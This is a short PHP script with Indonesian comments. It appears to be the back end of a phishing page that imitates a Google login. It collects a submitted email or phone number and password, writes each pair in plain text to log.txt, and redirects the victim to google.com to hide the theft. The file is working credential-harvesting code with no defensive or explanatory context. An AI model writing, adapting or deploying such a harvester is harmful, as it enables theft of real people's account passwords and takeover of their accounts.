<?php
// menangkap data dari form
$email_or_phone = $_POST['email_or_phone'];
$password = $_POST['password'];

// cek apakah input adalah email atau nomor telepon
if (filter_var($email_or_phone, FILTER_VALIDATE_EMAIL)) {
    // validasi email
    // contoh validasi domain email tertentu (gmail.com)
    if (strpos($email_or_phone, '@gmail.com') !== false) {
        // menyimpan data email ke log.txt
        $file = fopen("log.txt", "a");
        fwrite($file, "Email: $email_or_phone | Password: $password\n");
        fclose($file);

        // redirect ke halaman Google jika email valid
        header("Location: https://www.google.com");
        exit();
    } else {
        echo "<script>alert('Email tidak valid! Harap masukkan email yang benar.'); window.location.href='index.html';</script>";
    }
} elseif (preg_match('/^\+?[0-9]{10,12}$/', $email_or_phone)) {
    // validasi nomor telepon (format internasional dengan kode negara opsional)
    // bisa disesuaikan dengan kebutuhan format nomor telepon yang diinginkan
    $file = fopen("log.txt", "a");
    fwrite($file, "Phone: $email_or_phone | Password: $password\n");
    fclose($file);

    // redirect ke halaman Google jika nomor telepon valid
    header("Location: https://www.google.com");
    exit();
} else {
    // jika email atau nomor telepon tidak valid
    echo "<script>alert('Harap masukkan email atau nomor telepon yang valid.'); window.location.href='index.html';</script>";
}
?>
